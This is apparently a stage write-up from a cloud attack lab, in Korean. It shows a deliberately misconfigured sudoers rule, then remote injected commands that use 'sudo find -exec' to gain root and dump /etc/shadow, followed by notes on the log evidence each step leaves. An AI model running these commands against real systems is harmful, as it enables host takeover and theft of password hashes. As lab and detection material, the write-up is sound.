# 2단계: 권한 상승 (sudo find GTFOBins -> root) + 로컬 자격증명 덤프

MITRE ATT&CK: T1548.003 (Abuse Elevation Control Mechanism: Sudo and Sudo Caching),
T1003.008 (OS Credential Dumping: /etc/passwd and /etc/shadow)

## 배경

1단계 RCE는 비권한 `nextjs` 계정으로 떨어진다. bootstrap이 운영 편의로 심은 sudoers 오구성이
있다.

```
# /etc/sudoers.d/nextjs-maint
nextjs ALL=(ALL) NOPASSWD: /usr/bin/find
```

`find` 는 `-exec` 로 임의 명령을 실행할 수 있고, 그 명령은 sudo가 부여한 root 권한으로 돈다
(GTFOBins). 따라서 `nextjs` -> `root` 상승이 가능하다.

> 참고: 다음 단계(IMDS 자격증명 탈취)는 root가 필수가 아니다(어떤 사용자든 IMDS 도달 가능).
> 이 단계는 "호스트 완전 장악" 역량을 보여주는 독립 단계다.

## 악용

모든 명령은 1단계의 우회+주입 경로(`inject()`)로 원격에서 실행한다.

```bash
# 현재 권한(비권한 nextjs 확인)
inject "id"
# sudo 권한 점검 (find NOPASSWD 노출 확인)
inject "sudo -n -l"
# GTFOBins: find -exec 가 root로 실행된다. -maxdepth 0 으로 정확히 1회 실행.
inject "sudo -n /usr/bin/find /etc/hostname -maxdepth 0 -exec id ';'"
```

`id` 결과에 `uid=0(root)` 가 보이면 상승 성공이다.

## root 전용 행동: 로컬 자격증명 덤프 (T1003.008)

root를 얻은 이유를 실제로 사용한다. `/etc/shadow` 는 root만 읽을 수 있는 로컬 계정 password
hash 저장소다. 이를 덤프해 오프라인 크래킹/측면이동 재료로 삼는다. 3단계에서 탈취하는 **클라우드
자격증명(IMDS STS 키)** 과 별개인 **로컬 자격증명** 축을 함께 확보하는 그림이다.

```bash
# nextjs로는 불가, root(=find -exec)로만 가능
inject "sudo -n /usr/bin/find /etc/shadow -maxdepth 0 -exec cat '{}' ';'"
```

`scripts/02_privesc.sh` 가 상승 + shadow 덤프까지 자동화한다.

## 남는 증거 (분석 단계 대비)

- EC2 `/var/log/webapp/access.log`: 주입 요청의 `host="..."` 필드에 `sudo`+`find`+`-exec` 페이로드,
  그리고 shadow 덤프 요청의 `/etc/shadow` 가 남는다(주입 프리픽스의 `;` 로 command-injection 탐지에도
  함께 걸린다).
- EC2 sudo/auth 로그(`/var/log/secure`): `nextjs` 의 `sudo find` 실행 기록.
- 이 단계도 AWS API를 부르지 않아 CloudTrail에는 남지 않는다.

## 실행 결과

실제 실행 시각·확인된 uid 등 재구성된 타임라인은 `analysis/timeline.md`,
침해 지표는 `analysis/iocs.md` 참조.
